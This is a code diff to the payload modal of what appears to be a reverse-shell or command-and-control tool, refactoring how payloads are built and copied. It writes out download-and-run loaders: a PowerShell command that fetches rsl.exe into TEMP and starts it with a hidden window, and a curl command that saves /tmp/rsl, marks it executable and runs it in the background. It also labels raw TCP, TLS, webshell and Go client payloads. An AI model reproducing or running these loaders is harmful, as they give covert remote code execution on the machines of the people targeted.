@@ -1415,29 +1415,35 @@ const PayloadsModal = () =>
       const muxDownloadPayload = isWindows
         ? `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
         : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
-      const copy = (text) =>
-        navigator.clipboard.writeText(text).catch(() => {});
-      const block = (title, text) =>
+      const makeMuxDownloadPayload = () => {
+        const isWindows = app.payloadOs === "windows";
+        return isWindows
+          ? `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
+          : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
+      };
+      const copy = (fn) =>
+        navigator.clipboard.writeText(typeof fn === "function" ? fn() : fn).catch(() => {});
+      const block = (title, fn) =>
         el(
           "div",
           { class: "payload-block" },
-          el("div", { class: "list-group-label" }, el("span", {}, title)),
-          el("pre", { class: "payload-script" }, text),
+          el("div", { class: "list-group-label" }, el("span", {}, typeof title === "function" ? title() : title)),
+          el("pre", { class: "payload-script" }, fn),
           el(
             "button",
-            { class: "btn micro", onclick: () => copy(text) },
+            { class: "btn micro", onclick: () => copy(fn) },
             "Copy"
           )
         );
-      const allPayloads =
+      const allPayloads = () =>
         `# Raw TCP\n${tcpPayload}\n\n` +
         `# TLS\n${tlsPayload}\n\n` +
         `# HTTP webshell\n${webPayload}\n\n` +
         `# Mux / Go client\n${muxPayload}\n\n` +
-        `# Mux / download & run (${os}/${arch})\n${muxDownloadPayload}`;
+        `# Mux / download & run (${app.payloadOs}/${app.payloadArch})\n${makeMuxDownloadPayload()}`;
       const copyAll = async () => {
         try {
-          await navigator.clipboard.writeText(allPayloads);
+          await navigator.clipboard.writeText(allPayloads());
           app.payloadsCopiedAll = true;
           setTimeout(() => (app.payloadsCopiedAll = false), 1500);
         } catch {
@@ -1489,7 +1495,7 @@ const PayloadsModal = () =>
           block("TLS", tlsPayload),
           block("HTTP webshell", webPayload),
           block("Mux / Go client", muxPayload),
-          block(`Mux / download & run (${os}/${arch})`, muxDownloadPayload),
+          block(() => `Mux / download & run (${app.payloadOs}/${app.payloadArch})`, makeMuxDownloadPayload),
         ],
       });
     }
